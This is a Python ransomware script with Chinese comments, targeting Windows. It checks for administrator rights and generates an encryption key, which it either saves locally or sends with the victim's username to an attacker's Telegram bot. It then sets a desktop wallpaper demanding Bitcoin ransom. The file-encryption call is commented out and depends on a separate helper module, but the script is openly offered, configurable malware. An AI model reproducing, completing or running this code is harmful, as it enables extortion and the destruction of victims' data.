#!/usr/bin/python3
# -*- coding: UTF-8 -*-
"""
@brief: 加密 Windows 上的个人文件
"""

from en_de_cryptor import CallMsgBox, En_De_cryptFile

"""一种密码算法库，主要功能有：对称加密、非对称加密、数字签名、随机数生成"""
from nacl.utils import random # 随机数生成（生成一个 bytes 字节串）
from nacl.secret import SecretBox # 对称加密
"""HTTP 请求"""
import requests
"""图片"""
from PIL import Image, ImageDraw, ImageFont
"""与操作系统相关"""
import os, ctypes, threading
from win32api import GetSystemMetrics



"""这部分参数，你可以根据自己的需求来修改"""
# 赋值为 0，代表不把解密密钥发送到 telegram，而是保存到本地
g_key_flag = 0

# 如果要向 telegram 发送解密密钥，请填写你的 telegram 账号信息
g_bot_token = ""
g_chat_id = ""

# 图片中的文本内容
g_price = '100,000,000'
g_wallet = '......test......'
g_email = 'test@test.com'




"""向 telegram 账号发送解密密钥"""
def SendKey(key_val):
	global g_bot_token, g_chat_id

	try:
		user = os.getlogin()
		message = (f"用户 {user} 的解密密钥为 {key_val}")
		url = (f"https://api.telegram.org/bot{g_bot_token}/sendMessage?chat_id={g_chat_id}&text={message}")
		# 发送
		requests.get(url)
	except: pass


'''设置 Windows 的桌面壁纸，用于提醒对方，他的资料已经被加密了'''
def SetWallpaper():
	global g_price, g_wallet, g_email

	# 设置图片信息（像素大小和背景色）
	img = Image.new('RGB', (GetSystemMetrics(0), GetSystemMetrics(1)), color = (0, 0, 0))
	# 创建画布
	canvas = ImageDraw.Draw(img)
	# 获取合适的字体大小
	font_size = ImageFont.truetype("arial", int(GetSystemMetrics(1)/20))

	# 在图片上写字
	canvas.text(
		(10,10), 
		(f"""
			Your data Is encrypted
			
			In order to get your date back
			> Send me {g_price} USD in BTC to my wallet:
					{g_wallet}
			> and then email me for your decryption key:
					{g_email}
			
			GoodLuck"""), 
		fill=(255,0,0), font=font_size
	)

	img.save('Bg.png')
	
	# 当前工作目录
	path = os.getcwd()
	# SystemParametersInfoW() 是 Windows API 函数，用于设置系统参数
	# 参数 20 指的是设置桌面壁纸
	ctypes.windll.user32.SystemParametersInfoW(20, 0, f'{path}\\Bg.png' , 0)



def main():
	global g_key_flag

	# 如果此脚本没有管理员权限
	is_admin = ctypes.windll.shell32.IsUserAnAdmin()
	if is_admin != 1:
		CallMsgBox(1, "Error", "Try To Re-Run As Administrator")
	
	else:
		# 随机密钥
		key_val = random(SecretBox.KEY_SIZE)

		# 发送密钥到 telegram
		if g_key_flag == 1: 
			threading.Thread(target=SendKey, args=(key_val,)).start()
		# 保存密钥到本地
		else:
			with open("./key", "wb") as file_handle:
				file_handle.write(key_val)
		
		SetWallpaper()

		# 加密
		# En_De_cryptFile(1, key_val)


if __name__ == '__main__':
	main()
